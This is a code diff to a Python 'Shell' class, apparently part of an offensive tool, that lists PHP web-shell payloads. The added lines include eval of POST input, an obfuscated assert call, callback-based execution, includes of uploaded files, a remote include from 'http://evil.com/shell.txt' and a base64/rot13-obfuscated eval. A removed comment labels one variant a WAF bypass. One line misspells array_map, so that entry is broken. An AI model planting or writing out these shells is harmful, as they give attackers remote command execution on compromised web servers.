@@ -102,12 +102,18 @@ class Shell(object):
         super(Shell, self).__init__()
         self.stype = stype
         self.phpShells = [
-            "<?php @eval($_POST['$%s'])?>",
-            "<?php @eval($GLOBALS['_POST']['%s']);?>",
-            # "<?php @eval($_FILE['name']);?>",
+            "@eval($_POST['$%s'])?>",
+            "@eval($GLOBALS['_POST']['%s']);?>",
+            "@eval($_FILE['name']);?>",
             '$k="ass"."ert"; $k(${"_PO"."ST"} ["%s"]);',
-            # waf bypass
-            '<?php ($_=@$_GET[2]).@$_($_POST[1])?>'
+            '($_=@$_GET[2]).@$_($_POST[1])?>',
+            'arrary_map("eval", $_POST);',
+            'usort($_POST[A], $_POST[B]);',
+            'include $_FILES["filename"]["tmp_name"];',
+            'require $_FILES["filename"]["tmp_name"];',
+            'require "http://evil.com/shell.txt";',
+            'eval(gzdeflate(base64_decode(str_rot13($_POST[A]))));',
+            'create_function($_POST[A], $_POST[B]);',
         ]
 
     def basic(self, pwd="a"):
